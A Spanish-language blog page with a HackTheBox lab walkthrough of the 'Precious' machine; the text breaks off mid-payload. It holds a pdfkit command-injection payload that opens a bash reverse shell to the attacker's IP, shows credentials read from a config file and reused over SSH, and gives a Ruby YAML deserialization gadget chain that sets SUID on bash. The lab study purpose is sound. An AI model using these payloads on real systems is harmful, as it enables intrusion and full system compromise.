  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get MODE_ATTR() { return "data-mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/favicons/avatar.ico" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">H4ckerLite | Blog</a>
    </div>
    <div class="site-subtitle font-italic">WriteUps, Pentesting</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>INICIO</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORÍAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ETIQUETAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ACERCA DE</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVO</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/H4ckerLite" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/mortzelo" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="https://app.hackthebox.com/profile/824495" aria-label="hackthebox"
        target="_blank" rel="noopener">
        <i class="fas fa-cube"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Inicio
            </a>
          </span>

        

      

        

      

        

          
            <span>Precious WriteUp</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Entrada
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Buscar...">
    </span>
    <span id="search-cancel" >Cancelar</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4 pb-5">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->





<h1 data-toc-skip>Precious WriteUp</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Publicado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1673884800"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-01-16
</em>

    </span>

    <!-- lastmod date -->
    
    <span>
      Actualizado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1678674140"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-03-12
</em>

    </span>
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="../../assets/img/commons/precious-writeup/Precious.png" class="preview-img bg"
        alt="Precious WriteUp"

      

       data-proofer-ignore>

      
        <figcaption class="text-center pt-2 pb-2">Precious WriteUp</figcaption>
      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author -->
    <span>
      
      

      

      Por

      <em>
        
        H4ckerLite
        
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1282 palabras">
  <em>7 min</em> de lectura</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Les explicaré cómo comprometer la máquina <a href="https://app.hackthebox.com/machines/513">Precious</a> de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de <code class="language-plaintext highlighter-rouge">pdfkit</code> con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID.</p>

<h2 id="identificando-el-os"><span class="mr-2">Identificando el OS</span><a href="#identificando-el-os" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Para ello debemos enviar una traza ICMP(Internet Control Message Protocol), estas siglas sinifican <code class="language-plaintext highlighter-rouge">Protocolo de Mensajes de Control de Internet</code> y con la información que nos reporte podemos identificar el SO mediante el TTL(Time To live)</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>❯ ping <span class="nt">-c1</span> 10.10.11.189
PING 10.10.11.189 <span class="o">(</span>10.10.11.189<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.189: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>146 ms

<span class="nt">---</span> 10.10.11.189 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 146.342/146.342/146.342/0.000 ms
</pre></td></tr></tbody></table></code></div></div>

<p>Vemos lo siguiente:</p>
<ul>
  <li>TTL
    <ul>
      <li>El TTL es 63, esto indica que es una máquina Linux, ya que dichas máquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.</li>
    </ul>
  </li>
</ul>

<h2 id="primeros-pasos"><span class="mr-2">Primeros pasos</span><a href="#primeros-pasos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Si le aplicamos un curl con modo silent y para ver por las cabeceras y filtrando por <code class="language-plaintext highlighter-rouge">location</code> vemos un dominio</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>❯ curl s 10.10.11.189 <span class="nt">-i</span> | <span class="nb">grep </span>Location
Location: http://precious.htb/
</pre></td></tr></tbody></table></code></div></div>
<p>Sabiendo que se aplica Virtual Hosting debemos agregar el dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo </span>10.10.11.189   precious.htb   | <span class="nb">tee</span> <span class="nt">-a</span> /etc/hosts
</pre></td></tr></tbody></table></code></div></div>
<h2 id="escaneo-nmap"><span class="mr-2">Escaneo NMAP</span><a href="#escaneo-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Siempre que queramos auditar una máquina debemos aplicar un escaneo <code class="language-plaintext highlighter-rouge">NMAP</code>, ya que nos permitirá saber que puertos estan abiertos para poder empezar la fase de explotación</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.189
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-02-19 12:45 <span class="nt">-04</span>
Initiating SYN Stealth Scan at 12:45
Scanning 10.10.11.189 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.11.189
Discovered open port 22/tcp on 10.10.11.189
Completed SYN Stealth Scan at 12:46, 15.23s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.11.189
Host is up, received user-set <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2023-02-19 12:45:56 <span class="nt">-04</span> <span class="k">for </span>15s
Not shown: 65471 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 62 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.35 seconds
           Raw packets sent: 74834 <span class="o">(</span>3.293MB<span class="o">)</span> | Rcvd: 73784 <span class="o">(</span>2.951MB<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Vemos los puertos
    <ul>
      <li>22 este puerto corre por defecto el servicio SSH</li>
      <li>80 este es el encargado del purto WEB, es decir el HTTP</li>
    </ul>
  </li>
</ul>

<h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Vemos que en la web podemos convertir una Web a PDF, suena interesante, así que nos creamos un archivo <code class="language-plaintext highlighter-rouge">.html</code> con la siguiete estructura
<img data-src="/assets/img/commons/precious-writeup/web.png" alt="Página" class="center-image" data-proofer-ignore>
<em>Página Web</em></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>❯ cat index.html
&lt;h1&gt; Hola Mundo &lt;/h1&gt;
</pre></td></tr></tbody></table></code></div></div>
<p>Creamos un servivor HTTP con python por el puerto 80 y en dicha web ponemos nustro servidor.</p>
<blockquote>
  <p>Recuerda cambiar tu IP.</p>
</blockquote>

<p><img data-src="/assets/img/commons/precious-writeup/http.png" alt="PDF" class="center-image" data-proofer-ignore>
<em>WEB</em></p>

<p>Al darle <code class="language-plaintext highlighter-rouge">Submit</code> nos genera el PDF, si miramos los metadatos vemos la versión de <code class="language-plaintext highlighter-rouge">PDFKIT</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>❯ exiftool PDF.pdf
ExifTool Version Number         : 12.16
File Name                       : PDF.pdf
Directory                       : <span class="nb">.</span>
File Size                       : 10 KiB
File Modification Date/Time     : 2023:02:19 13:10:53-04:00
File Access Date/Time           : 2023:02:19 13:10:53-04:00
File Inode Change Date/Time     : 2023:02:19 13:11:14-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
</pre></td></tr></tbody></table></code></div></div>
<p>Al hacer una simple busqueda por google, nos encontramos con este <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">articulo</a></p>

<p>Al usar este payload, debemos cambiar el sleep por una reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://example.com/?name<span class="o">=</span><span class="c">#{'%20`sleep 5`'}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Nos quedaría de esta manera.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://example.com/?name<span class="o">=</span><span class="c">#{'%20`bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.19/444 0&gt;&amp;1"`'}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Una vez enviada la petición nos llega la reverse shell</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>❯ nc <span class="nt">-lvnp</span> 444
listening on <span class="o">[</span>any] 444 ...
connect to <span class="o">[</span>10.10.14.19] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.189] 47004
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>676<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
ruby@precious:/var/www/pdfapp<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>

<p>Aplicamos un tratamiento a la <a href="https:://h4ckerlite.github.io/posts/tty">TTY</a></p>
<h2 id="migrando-de-usuario"><span class="mr-2">Migrando de Usuario</span><a href="#migrando-de-usuario" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Somos el usuario <code class="language-plaintext highlighter-rouge">ruby</code>, si miramos en el directorio <em>home</em> por archivos ocultos nos encontramos con esto</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>ruby@precious:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 32
drwxr-xr-x 5 ruby ruby 4096 Feb 19 12:28 <span class="nb">.</span>
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 ruby ruby  220 Mar 27  2022 .bash_logout
<span class="nt">-rw-r--r--</span> 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 4 ruby ruby 4096 Feb 19 08:27 .cache
drwxr-xr-x 3 ruby ruby 4096 Feb 19 12:28 .local
<span class="nt">-rw-r--r--</span> 1 ruby ruby  807 Mar 27  2022 .profile
</pre></td></tr></tbody></table></code></div></div>

<p>Si leemos lo que exixte dentro de esa carpeta vemos las credenciales del usuario henry</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>ruby@precious:~<span class="nv">$ </span><span class="nb">cat</span> .bundle/config 
<span class="nt">---</span>
BUNDLE_HTTPS://RUBYGEMS__ORG/: <span class="s2">"henry:Q3c1AqGHtoI0aXAYFH"</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Migramos de usuario</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>ruby@precious:~<span class="nv">$ </span>ssh henry@10.10.11.189
The authenticity of host <span class="s1">'10.10.11.189 (10.10.11.189)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.189<span class="s1">' (ECDSA) to the list of known hosts.
henry@10.10.11.189'</span>s password: Q3c1AqGHtoI0aXAYFH 
Linux precious 5.10.0-19-amd64 <span class="c">#1 SMP Debian 5.10.149-2 (2022-10-21) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Feb 19 10:46:31 2023 from 10.10.14.103
henry@precious:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Procedemos a leer la flag del usuario</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>henry@precious:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
67<span class="k">****************************</span>bc
henry@precious:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de Privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Viendo por permisos <strong>SUDO</strong> nos encontramos con este</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>henry@precious:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>henry on precious:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User henry may run the following commands on precious:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
</pre></td></tr></tbody></table></code></div></div>
<p>Si leemos ese archivo vemos que intenta cargar el archivo “dependencies.yml”, si buscamos por internet nos encontramos con este <a href="https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/">blog</a> y este repositorio de <a href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565">GitHub</a>, nos creamos un archi con este contenido.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="nt">---</span>
- <span class="o">!</span>ruby/object:Gem::Installer
    i: x
- <span class="o">!</span>ruby/object:Gem::SpecFetcher
    i: y
- <span class="o">!</span>ruby/object:Gem::Requirement
  requirements:
    <span class="o">!</span>ruby/object:Gem::Package::TarReader
    io: &amp;1 <span class="o">!</span>ruby/object:Net::BufferedIO
      io: &amp;1 <span class="o">!</span>ruby/object:Gem::Package::TarReader::Entry
         <span class="nb">read</span>: 0
         header: <span class="s2">"abc"</span>
      debug_output: &amp;1 <span class="o">!</span>ruby/object:Net::WriteAdapter
         socket: &amp;1 <span class="o">!</span>ruby/object:Gem::RequestSet
             sets: <span class="o">!</span>ruby/object:Net::WriteAdapter
                 socket: <span class="o">!</span>ruby/module <span class="s1">'Kernel'</span>
                 method_id: :system
             git_set: <span class="nb">id
         </span>method_id: :resolve
</pre></td></tr></tbody></table></code></div></div>

<p>Cambiamos el <strong>id</strong> por:</p>
<blockquote>
  <p>chmod +s /bin/bash</p>
</blockquote>

<p>Con esto nuestra BASH sera <strong>SUID</strong></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="nt">---</span>
- <span class="o">!</span>ruby/object:Gem::Installer
    i: x
- <span class="o">!</span>ruby/object:Gem::SpecFetcher
    i: y
- <span class="o">!</span>ruby/object:Gem::Requirement
  requirements:
    <span class="o">!</span>ruby/object:Gem::Package::TarReader
    io: &amp;1 <span class="o">!</span>ruby/object:Net::BufferedIO
      io: &amp;1 <span class="o">!</span>ruby/object:Gem::Package::TarReader::Entry
         <span class="nb">read</span>: 0
         header: <span class="s2">"abc"</span>
      debug_output: &amp;1 <span class="o">!</span>ruby/object:Net::WriteAdapter
         socket: &amp;1 <span class="o">!</span>ruby/object:Gem::RequestSet
             sets: <span class="o">!</span>ruby/object:Net::WriteAdapter
